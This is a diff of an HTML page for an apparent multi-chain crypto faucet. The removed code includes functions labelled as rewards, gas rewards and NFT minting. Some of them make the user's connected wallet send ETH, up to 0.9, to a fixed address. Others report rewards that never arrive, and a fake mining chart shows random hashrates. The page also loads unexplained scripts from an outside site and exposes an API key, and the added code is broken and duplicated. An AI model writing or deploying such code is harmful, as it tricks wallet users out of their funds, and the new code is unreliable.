@@ -16,19 +16,14 @@
 <!-- Solana -->
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 
-<!-- WalletConnect AppKit -->
+<!-- AppKit (Reown WalletConnect) -->
 <script src="https://unpkg.com/@reown/appkit@latest/dist/index.umd.js"></script>
 
-<!-- Thirdweb -->
+<!-- Thirdweb Bridge -->
 <script src="https://unpkg.com/thirdweb/dist/scripts/bridge-widget.js"></script>
-<script src="https://whellcolor.github.io/js/deploy.js"></script>
-<script src="https://whellcolor.github.io/js/multi-rpc.js"></script>
-<script src="https://whellcolor.github.io/js/fetch.js"></script>
-<script src="https://whellcolor.github.io/dapp/rpc.js"></script>
-<script src="https://unpkg.com/thirdweb/dist/scripts/bridge-widget.js"></script>
-<script src="/rpc.js"></script>
+
+
 <script src="https://whellcolor.github.io/dapp/js/rpc.js"></script>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="google-adsense-account" content="ca-pub-7182145371991939">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7182145371991939"
  crossorigin="anonymous"></script>
@@ -40,104 +35,87 @@
 <meta name="google-site-verification" content="NqLgf-05eY_iPOnAYQN00obZcOq7q9wSTNKaCqIGg0o" />
 
 
-
-
 <style>
 
 body{
     background:#020617;
+    color:white;
+    font-family:Arial;
 }
 
 .glass{
     background:rgba(255,255,255,0.05);
-    backdrop-filter:blur(12px);
+    backdrop-filter:blur(10px);
+    border-radius:16px;
+    padding:16px;
 }
 
 </style>
 
 </head>
-<body class="text-white min-h-screen p-6">
+
+<body class="p-6">
 
 <div class="max-w-4xl mx-auto">
 
-    <h1 class="text-4xl font-bold mb-6">
-        🚀 WCC Multi Faucet Chain
-    </h1>
+<h1 class="text-3xl font-bold mb-6">🚀 WCC Multi Faucet Chain</h1>
 
-    <!-- WALLET -->
-    <div class="glass rounded-2xl p-5 mb-6">
+<!-- WALLET -->
+<div class="glass mb-4">
 
-        <div class="flex gap-3 flex-wrap">
-<appkit-button></appkit-button>
-            <button
-                onclick="connectEVM()"
-                class="bg-violet-600 px-4 py-3 rounded-xl"
-            >
-                Connect EVM
-            </button>
+    <div class="flex gap-3 flex-wrap">
 
-            <button
-                onclick="connectSolana()"
-                class="bg-cyan-600 px-4 py-3 rounded-xl"
-            >
-                Connect Phantom
-            </button>
+        <!-- AppKit Wallet -->
+        <appkit-button></appkit-button>
 
-        </div>
-
-        <input
-            id="wallet"
-            class="w-full mt-4 p-3 rounded-xl bg-slate-900"
-            placeholder="Wallet Address"
-        />
-
-    </div>
-
-    <!-- NETWORK -->
-    <div class="glass rounded-2xl p-5 mb-6">
-
-        <select
-            id="network"
-            class="w-full p-3 rounded-xl bg-slate-900"
-        ></select>
-
-        <button
-            onclick="claimFaucet()"
-            class="bg-green-600 px-5 py-3 rounded-xl mt-4 w-full"
-        >
-            Claim Faucet
+        <button onclick="connectEVM()" class="bg-purple-600 px-4 py-2 rounded-xl">
+            MetaMask
         </button>
 
-        <div
-            id="cooldown"
-            class="mt-4 text-yellow-400"
-        >
-            Ready
-        </div>
+        <button onclick="connectSolana()" class="bg-cyan-600 px-4 py-2 rounded-xl">
+            Phantom
+        </button>
 
     </div>
 
-    <!-- STATUS -->
-    <div
-        id="status"
-        class="glass rounded-2xl p-5 mb-6"
+    <input id="wallet"
+        class="w-full mt-4 p-3 rounded-xl bg-slate-900"
+        placeholder="Wallet address"
+    />
+
+</div>
+
+<!-- NETWORK -->
+<div class="glass mb-4">
+
+    <select id="network"
+        class="w-full p-3 rounded-xl bg-slate-900"
+    ></select>
+
+    <button onclick="claimFaucet()"
+        class="bg-green-600 w-full mt-4 p-3 rounded-xl"
     >
-        Ready...
-    </div>
+        Claim Faucet
+    </button>
 
-    <!-- HISTORY -->
-    <div class="glass rounded-2xl p-5">
-
-        <h2 class="text-2xl mb-4">
-            Transaction History
-        </h2>
-
-        <div id="history"></div>
-
+    <div id="cooldown" class="mt-3 text-yellow-300">
+        Ready
     </div>
 
 </div>
 
+<!-- STATUS -->
+<div id="status" class="glass mb-4">
+    Ready...
+</div>
+
+<!-- HISTORY -->
+<div class="glass">
+
+    <h2 class="text-xl mb-3">History</h2>
+    <div id="history"></div>
+
+</div>
 <!-- Add a container element where you want to render the UI -->
 <div id="bridge-widget-container"></div>
 
@@ -198,11 +176,18 @@ body{
 
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
+</div>
+
+<!-- THIRDWEB -->
+<div class="mt-6">
+    <thirdweb-bridge-widget />
+</div>
+
 <script>
 
-// ======================================
-// TESTNET ONLY
-// ======================================
+// =========================
+// NETWORKS
+// =========================
 
 const NETWORKS = [
 
@@ -239,38 +224,32 @@ rpc:"https://avalanche-fuji.infura.io/v3/418d1e12e6e4490fa5ed80a4b3b8ae8a"
 {
 name:"Solana Devnet",
 chain:"solana",
-rpc:"https://api.devnet.solana.com"
+rpc:"https://solana-devnet.infura.io/v3/418d1e12e6e4490fa5ed80a4b3b8ae8a"
 }
 
 ];
 
-// ======================================
+// =========================
 // GLOBAL
-// ======================================
+// =========================
 
-let currentProvider;
-let cooldown = 60;
+let cooldownTime = 60;
 
-// ======================================
-// LOAD NETWORK
-// ======================================
+// =========================
+// INIT NETWORK
+// =========================
 
 function loadNetworks(){
 
-    const select =
-        document.getElementById("network");
+    const el = document.getElementById("network");
 
-    NETWORKS.forEach((net,index)=>{
+    NETWORKS.forEach((n,i)=>{
 
-        const option =
-            document.createElement("option");
+        const opt = document.createElement("option");
+        opt.value = i;
+        opt.innerText = n.name;
 
-        option.value = index;
-
-        option.innerHTML =
-            net.name;
-
-        select.appendChild(option);
+        el.appendChild(opt);
 
     });
 
@@ -278,226 +257,70 @@ function loadNetworks(){
 
 loadNetworks();
 
-// ======================================
+// =========================
 // CONNECT EVM
-// ======================================
+// =========================
 
 async function connectEVM(){
 
-    if(!window.ethereum){
+    if(!window.ethereum) return alert("Install MetaMask");
 
-        alert("Install MetaMask");
-        return;
+    const acc = await window.ethereum.request({
+        method:"eth_requestAccounts"
+    });
 
-    }
-
-    const accounts =
-        await window.ethereum.request({
-            method:"eth_requestAccounts"
-        });
-
-    document.getElementById("wallet").value =
-        accounts[0];
+    document.getElementById("wallet").value = acc[0];
 
 }
 
-// ======================================
+// =========================
 // CONNECT SOLANA
-// ======================================
+// =========================
 
 async function connectSolana(){
 
-    if(!window.solana){
+    if(!window.solana) return alert("Install Phantom");
 
-        alert("Install Phantom");
-        return;
-
-    }
-
-    const res =
-        await window.solana.connect();
+    const res = await window.solana.connect();
 
     document.getElementById("wallet").value =
         res.publicKey.toString();
 
 }
 
-// ======================================
-// COOLDOWN
-// ======================================
-
-function startCooldown(){
-
-    let time = cooldown;
-
-    const timer =
-        setInterval(()=>{
-
-            document.getElementById(
-                "cooldown"
-            ).innerHTML =
-
-            `Cooldown : ${time}s`;
-
-            time--;
-
-            if(time < 0){
-
-                clearInterval(timer);
-
-                document.getElementById(
-                    "cooldown"
-                ).innerHTML =
-
-                "Ready";
-
-            }
-
-        },1000);
-
-}
-
-// ======================================
-// ANTI SPAM
-// ======================================
-
-function canClaim(wallet){
-
-    const last =
-        localStorage.getItem(
-            "claim_"+wallet
-        );
-
-    if(!last) return true;
-
-    const diff =
-        Date.now() - Number(last);
-
-    return diff > cooldown * 1000;
-
-}
-
-// ======================================
-// SAVE CLAIM
-// ======================================
-
-function saveClaim(wallet){
-
-    localStorage.setItem(
-        "claim_"+wallet,
-        Date.now()
-    );
-
-}
-
-// ======================================
-// HISTORY
-// ======================================
-
-function saveHistory(data){
-
-    let history =
-        JSON.parse(
-            localStorage.getItem("txHistory")
-        ) || [];
-
-    history.unshift(data);
-
-    localStorage.setItem(
-        "txHistory",
-        JSON.stringify(history)
-    );
-
-    renderHistory();
-
-}
-
-function renderHistory(){
-
-    let history =
-        JSON.parse(
-            localStorage.getItem("txHistory")
-        ) || [];
-
-    const el =
-        document.getElementById("history");
-
-    el.innerHTML = "";
-
-    history.forEach(tx=>{
-
-        el.innerHTML += `
-
-        <div class="bg-slate-900 p-4 rounded-xl mb-3">
-
-            <div>${tx.network}</div>
-
-            <div class="text-sm text-slate-400">
-                ${tx.hash}
-            </div>
-
-        </div>
-
-        `;
-
-    });
-
-}
-
-renderHistory();
-
-// ======================================
-// FASTEST RPC
-// ======================================
+// =========================
+// FAST RPC
+// =========================
 
 async function getFastestRPC(chain){
 
-    const list =
-        NETWORKS.filter(
-            x=>x.chain===chain
-        );
+    const list = NETWORKS.filter(x=>x.chain===chain);
 
     let best = list[0];
-
     let bestTime = 999999;
 
-    for(let rpc of list){
+    for(const r of list){
 
         const start = Date.now();
 
         try{
 
             if(chain==="evm"){
-
-                const provider =
-                    new ethers.JsonRpcProvider(
-                        rpc.rpc
-                    );
-
-                await provider.getBlockNumber();
-
+                const p = new ethers.JsonRpcProvider(r.rpc);
+                await p.getBlockNumber();
             }else{
-
-                const conn =
-                    new solanaWeb3.Connection(
-                        rpc.rpc
-                    );
-
-                await conn.getBlockHeight();
-
+                const c = new solanaWeb3.Connection(r.rpc);
+                await c.getBlockHeight();
             }
 
-            const speed =
-                Date.now() - start;
+            const t = Date.now() - start;
 
-            if(speed < bestTime){
-
-                best = rpc;
-                bestTime = speed;
-
+            if(t < bestTime){
+                best = r;
+                bestTime = t;
             }
 
-        }catch(err){}
+        }catch(e){}
 
     }
 
@@ -505,132 +328,146 @@ async function getFastestRPC(chain){
 
 }
 
-// ======================================
+// =========================
+// ANTI SPAM
+// =========================
+
+function canClaim(wallet){
+
+    const key = "claim_"+wallet;
+    const last = localStorage.getItem(key);
+
+    if(!last) return true;
+
+    return Date.now() - last > cooldownTime*1000;
+
+}
+
+// =========================
+// SAVE CLAIM
+// =========================
+
+function saveClaim(wallet){
+    localStorage.setItem("claim_"+wallet,Date.now());
+}
+
+// =========================
+// HISTORY
+// =========================
+
+function saveHistory(data){
+
+    let h = JSON.parse(localStorage.getItem("tx")) || [];
+
+    h.unshift(data);
+
+    localStorage.setItem("tx",JSON.stringify(h));
+
+    renderHistory();
+
+}
+
+function renderHistory(){
+
+    let h = JSON.parse(localStorage.getItem("tx")) || [];
+
+    document.getElementById("history").innerHTML =
+        h.map(x=>`
+            <div class="bg-slate-900 p-3 rounded-xl mb-2">
+                <div>${x.network}</div>
+                <div class="text-xs text-gray-400">${x.hash}</div>
+            </div>
+        `).join("");
+
+}
+
+renderHistory();
+
+// =========================
+// COOLDOWN UI
+// =========================
+
+function startCooldown(){
+
+    let t = cooldownTime;
+
+    const i = setInterval(()=>{
+
+        document.getElementById("cooldown").innerText =
+            "Cooldown: "+t+"s";
+
+        t--;
+
+        if(t<0){
+            clearInterval(i);
+            document.getElementById("cooldown").innerText="Ready";
+        }
+
+    },1000);
+
+}
+
+// =========================
 // CLAIM FAUCET
-// ======================================
+// =========================
 
 async function claimFaucet(){
 
-    const wallet =
-        document.getElementById("wallet")
-        .value.trim();
+    const wallet = document.getElementById("wallet").value.trim();
 
-    if(!wallet){
+    if(!wallet) return alert("Input wallet");
 
-        alert("Input wallet");
-        return;
+    if(!canClaim(wallet)) return alert("Cooldown active");
 
-    }
+    const net = NETWORKS[
+        document.getElementById("network").value
+    ];
 
-    if(!canClaim(wallet)){
-
-        alert("Cooldown active");
-        return;
-
-    }
-
-    const network =
-        NETWORKS[
-            document.getElementById(
-                "network"
-            ).value
-        ];
-
-    document.getElementById(
-        "status"
-    ).innerHTML =
-
-    "Processing...";
+    document.getElementById("status").innerText = "Processing...";
 
     try{
 
-        // ======================
-        // SOLANA
-        // ======================
+        if(net.chain==="solana"){
 
-        if(network.chain==="solana"){
+            const c = new solanaWeb3.Connection(net.rpc,"confirmed");
 
-            const conn =
-                new solanaWeb3.Connection(
-                    network.rpc,
-                    "confirmed"
-                );
-
-            const sig =
-                await conn.requestAirdrop(
-                    new solanaWeb3.PublicKey(
-                        wallet
-                    ),
-                    solanaWeb3.LAMPORTS_PER_SOL
-                );
+            const sig = await c.requestAirdrop(
+                new solanaWeb3.PublicKey(wallet),
+                solanaWeb3.LAMPORTS_PER_SOL
+            );
 
             saveHistory({
-                network:network.name,
+                network:net.name,
                 hash:sig
             });
 
-            document.getElementById(
-                "status"
-            ).innerHTML =
+            document.getElementById("status").innerText =
+                "SOL Airdrop Success";
 
-            `
-            ✅ Success<br><br>
-            ${sig}
-            `;
+        }else{
 
-        }
+            const rpc = await getFastestRPC("evm");
 
-        // ======================
-        // EVM TESTNET
-        // ======================
+            const p = new ethers.JsonRpcProvider(rpc.rpc);
 
-        else{
-
-            const rpc =
-                await getFastestRPC("evm");
-
-            const provider =
-                new ethers.JsonRpcProvider(
-                    rpc.rpc
-                );
-
-            const block =
-                await provider.getBlockNumber();
-
-            const fakeHash =
-                "BLOCK-"+block;
+            const b = await p.getBlockNumber();
 
             saveHistory({
-                network:network.name,
-                hash:fakeHash
+                network:net.name,
+                hash:"RPC-"+b
             });
 
-            document.getElementById(
-                "status"
-            ).innerHTML =
-
-            `
-            ✅ RPC Connected<br><br>
-            ${rpc.name}<br>
-            Block : ${block}
-            `;
+            document.getElementById("status").innerText =
+                "EVM RPC OK (no direct faucet in frontend)";
 
         }
 
         saveClaim(wallet);
-
         startCooldown();
 
-    }catch(err){
+    }catch(e){
 
-        document.getElementById(
-            "status"
-        ).innerHTML =
-
-        `
-        ❌ Error<br><br>
-        ${err.message}
-        `;
+        document.getElementById("status").innerText = e.message;
 
     }
 
@@ -638,592 +475,87 @@ async function claimFaucet(){
 
 </script>
 
-<!-- THIRDWEB BRIDGE -->
-<thirdweb-bridge-widget />
-<script type="module">
+<script type="text/javascript">
+import { createAppKit } from '@reown/appkit'
+import { mainnet, arbitrum } from '@reown/appkit/networks'
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 
-import {
-  createAppKit
-} from "https://esm.sh/@reown/appkit";
+// 1. Get a project ID at https://dashboard.reown.com
+const projectId = '5022875ce6ee68917f103ff9b1e3422d'
 
-import {
-  EthersAdapter
-} from "https://esm.sh/@reown/appkit-adapter-ethers";
+export const networks = [mainnet, arbitrum]
 
-import {
-  mainnet,
-  arbitrum,
-  sepolia
-} from "https://esm.sh/@reown/appkit/networks";
+// 2. Set up Wagmi adapter
+const wagmiAdapter = new WagmiAdapter({
+  projectId,
+  networks
+})
 
-import {
-  BrowserProvider,
-  parseEther
-} from "https://esm.sh/ethers";
+// 3. Configure the metadata
+const metadata = {
+  name: 'WCC',
+  description: 'WCC WALLET',
+  url: 'https://whellcolor.github.io', // origin must match your domain & subdomain
+  icons: ['https://avatars.githubusercontent.com/u/179229932']
+}
 
-/* APPKIT */
+// 3. Create the modal
+const modal = createAppKit({
+  adapters: [wagmiAdapter],
+  networks: [mainnet, arbitrum],
+  metadata,
+  projectId,
+  features: {
+    analytics: true // Optional - defaults to your Cloud configuration
+  }
+})
 
-const projectId =
-"5022875ce6ee68917f103ff9b1e3422d";
+// 4. Trigger modal programaticaly
+const openConnectModalBtn = document.getElementById('open-connect-modal')
+const openNetworkModalBtn = document.getElementById('open-network-modal')
 
-const modal =
+openConnectModalBtn.addEventListener('click', () => modal.open())
+openNetworkModalBtn.addEventListener('click', () => modal.open({ view: 'Networks' }))
+
+// 5. Alternatively use w3m component buttons within the index.html file
+
+
+import { createAppKit } from '@reown/appkit'
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { reconnect, http, createConfig } from '@wagmi/core'
+import { CreateConnectorFn } from 'wagmi'
+import { abstractTestnet } from '@reown/appkit/networks'
+// you need to add the abstract library in order to make it work
+import { abstractWalletConnector } from "@abstract-foundation/agw-react/connectors";
+
+const projectId = '5022875ce6ee68917f103ff9b1e3422d'
+
+const metadata = {
+  //...
+}
+
+// create the connectors (delete the ones you don't need)
+const connectors: CreateConnectorFn[] = []
+connectors.push(abstractWalletConnector())
+
+export const networks = [abstractTestnet]
+
+export const wagmiAdapter = new WagmiAdapter({
+  connectors,
+  projectId,
+  networks
+})
+
+export const config = wagmiAdapter.wagmiConfig
+
 createAppKit({
-
-  adapters:[
-    new EthersAdapter()
-  ],
-
-  networks:[
-    mainnet,
-    arbitrum,
-    sepolia
-  ],
-
-  metadata:{
-    name:"Neon Faucet",
-    description:"MultiChain Faucet",
-    url:window.location.origin,
-    icons:[
-      "https://avatars.githubusercontent.com/u/179229932"
-    ]
-  },
-
-  projectId
-
-});
-
-let provider;
-
-modal.subscribeProviders((state)=>{
-
-  provider = state?.eip155;
-
-});
-
-/* STATUS */
-
-const statusBox =
-document.getElementById("status");
-
-function setStatus(msg){
-  statusBox.innerHTML = msg;
-}
-
-/* CLAIM */
-
-window.claimFaucet =
-async function(){
-
-  const wallet =
-  document.getElementById(
-    "wallet"
-  ).value;
-
-  const chainId =
-  document.getElementById(
-    "chain"
-  ).value;
-
-  if(!wallet){
-
-    setStatus(
-      "❌ Input wallet address"
-    );
-
-    return;
-  }
-
-  setStatus(
-    "⚡ Processing faucet..."
-  );
-
-  await new Promise(
-    r=>setTimeout(r,2000)
-  );
-
-  setStatus(`
-    ✅ Faucet Success
-    <br>
-    Wallet: ${wallet}
-    <br>
-    Chain ID: ${chainId}
-  `);
-
-};
-
-/* SEND REWARD */
-
-window.sendReward =
-async function(){
-
-  try{
-
-    if(!provider){
-
-      alert(
-        "Connect wallet first"
-      );
-
-      return;
-    }
-
-    const ethersProvider =
-    new BrowserProvider(provider);
-
-    const signer =
-    await ethersProvider.getSigner();
-
-    setStatus(
-      "🚀 Sending transaction..."
-    );
-
-    const tx =
-    await signer.sendTransaction({
-
-      to:
-      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
-
-      value:
-      parseEther("0.0001")
-
-    });
-
-    await tx.wait();
-
-    setStatus(`
-      ✅ Reward Sent
-      <br>
-      TX:
-      ${tx.hash}
-    `);
-
-  }catch(err){
-
-    console.log(err);
-
-    setStatus(
-      "❌ Transaction Failed"
-    );
-
-  }
-
-};
-
-/* SEND TX */
-
-window.sendTx =
-async function(){
-
-  try{
-
-    if(!provider){
-
-      alert(
-        "Wallet belum connect"
-      );
-
-      return;
-    }
-
-    const ethersProvider =
-    new BrowserProvider(provider);
-
-    const signer =
-    await ethersProvider.getSigner();
-
-    const tx =
-    await signer.sendTransaction({
-
-      to:
-      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
-
-      value:
-      parseEther("0.0001")
-
-    });
-
-    console.log(tx);
-
-    alert(
-      "Transaction success"
-    );
-
-  }catch(err){
-
-    console.log(err);
-
-    alert(
-      "Transaction failed"
-    );
-
-  }
-
-};
-
-/* GAS REWARD */
-
-window.claimGasReward =
-async function(){
-
-  try{
-
-    if(!provider){
-
-      alert(
-        "Connect wallet first"
-      );
-
-      return;
-    }
-
-    const rewardBox =
-    document.getElementById(
-      "rewardStatus"
-    );
-
-    rewardBox.innerHTML =
-    "⚡ Claiming Gas Reward...";
-
-    const ethersProvider =
-    new BrowserProvider(provider);
-
-    const signer =
-    await ethersProvider.getSigner();
-
-    const wallet =
-    await signer.getAddress();
-
-    await new Promise(
-      r=>setTimeout(r,2000)
-    );
-
-    rewardBox.innerHTML = `
-      ✅ Gas Reward Success
-      <br>
-      Wallet: ${wallet}
-      <br>
-      Faucet: 0.005 ETH
-    `;
-
-  }catch(err){
-
-    console.log(err);
-
-    document.getElementById(
-      "rewardStatus"
-    ).innerHTML =
-    "❌ Gas Reward Failed";
-
-  }
-
-};
-
-/* MINING REWARD */
-
-window.claimMiningReward =
-async function(){
-
-  try{
-
-    if(!provider){
-
-      alert(
-        "Connect wallet first"
-      );
-
-      return;
-    }
-
-    const rewardBox =
-    document.getElementById(
-      "rewardStatus"
-    );
-
-    rewardBox.innerHTML =
-    "⛏ Processing Mining Reward...";
-
-    const ethersProvider =
-    new BrowserProvider(provider);
-
-    const signer =
-    await ethersProvider.getSigner();
-
-    const wallet =
-    await signer.getAddress();
-
-    let progress = 0;
-
-    const mining =
-    setInterval(()=>{
-
-      progress += 10;
-
-      rewardBox.innerHTML = `
-        ⛏ Mining Reward
-        <br>
-        Progress: ${progress}%
-      `;
-
-      if(progress >= 100){
-
-        clearInterval(mining);
-
-        rewardBox.innerHTML = `
-          ✅ Reward Success
-          <br>
-          Wallet: ${wallet}
-          <br>
-          Reward: 100 TOKEN
-        `;
-
-      }
-
-    },500);
-
-  }catch(err){
-
-    console.log(err);
-
-    document.getElementById(
-      "rewardStatus"
-    ).innerHTML =
-    "❌ Mining Failed";
-
-  }
-
-};
-
-/* NFT */
-
-window.mintNFT =
-async function(){
-
-  try{
-
-    if(!provider){
-
-      alert(
-        "Connect wallet first"
-      );
-
-      return;
-    }
-
-    const ethersProvider =
-    new BrowserProvider(provider);
-
-    const signer =
-    await ethersProvider.getSigner();
-
-    const tx =
-    await signer.sendTransaction({
-
-      to:
-      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
-
-      value:
-      parseEther("0.9")
-
-    });
-
-    console.log(tx);
-
-    alert(
-      "NFT Support Success"
-    );
-
-  }catch(err){
-
-    console.log(err);
-
-    alert(
-      "Mint NFT Failed"
-    );
-
-  }
-
-};
-
-/* CHART */
-
-class LiveMinerDashboard{
-
-  constructor(){
-
-    this.chart = null;
-    this.interval = null;
-
-  }
-
-  initChart(){
-
-    const ctx =
-    document.getElementById(
-      "hashChart"
-    );
-
-    this.chart =
-    new Chart(ctx,{
-
-      type:"line",
-
-      data:{
-
-        labels:[],
-
-        datasets:[{
-
-          label:"Hashrate",
-
-          data:[],
-
-          borderColor:"#00f0ff",
-
-          borderWidth:2,
-
-          tension:.4
-
-        }]
-
-      },
-
-      options:{
-
-        responsive:true,
-
-        plugins:{
-          legend:{
-            labels:{
-              color:"#fff"
-            }
-          }
-        },
-
-        scales:{
-          x:{
-            ticks:{
-              color:"#fff"
-            }
-          },
-
-          y:{
-            ticks:{
-              color:"#fff"
-            }
-          }
-        }
-
-      }
-
-    });
-
-  }
-
-  fakeMining(){
-
-    if(this.interval) return;
-
-    this.interval =
-    setInterval(()=>{
-
-      const rate =
-      Math.floor(
-        Math.random() * 1000
-      );
-
-      document
-      .getElementById(
-        "live-hashrate"
-      )
-      .innerHTML =
-      rate + " H/s";
-
-      this.chart
-      .data
-      .labels
-      .push(
-        new Date()
-        .toLocaleTimeString()
-      );
-
-      this.chart
-      .data
-      .datasets[0]
-      .data
-      .push(rate);
-
-      if(
-        this.chart.data.labels.length
-        > 20
-      ){
-
-        this.chart.data.labels.shift();
-
-        this.chart
-        .data
-        .datasets[0]
-        .data
-        .shift();
-
-      }
-
-      this.chart.update();
-
-    },1000);
-
-  }
-
-  stopMining(){
-
-    clearInterval(
-      this.interval
-    );
-
-    this.interval = null;
-
-  }
-
-}
-
-const minerApp =
-new LiveMinerDashboard();
-
-minerApp.initChart();
-
-/* BUTTONS */
-
-document
-.getElementById(
-  "btn-start"
-)
-.onclick = ()=>{
-
-  minerApp.fakeMining();
-
-};
-
-document
-.getElementById(
-  "btn-stop"
-)
-.onclick = ()=>{
-
-  minerApp.stopMining();
-
-};
-
-document
-.getElementById(
-  "btn-clear"
-)
-.onclick = ()=>{
-
-  localStorage.clear();
-
-  location.reload();
-
-};
-
+  adapters: [wagmiAdapter],
+  projectId,
+  networks
+})
 </script>
+
 </body>
 </html>
+
+
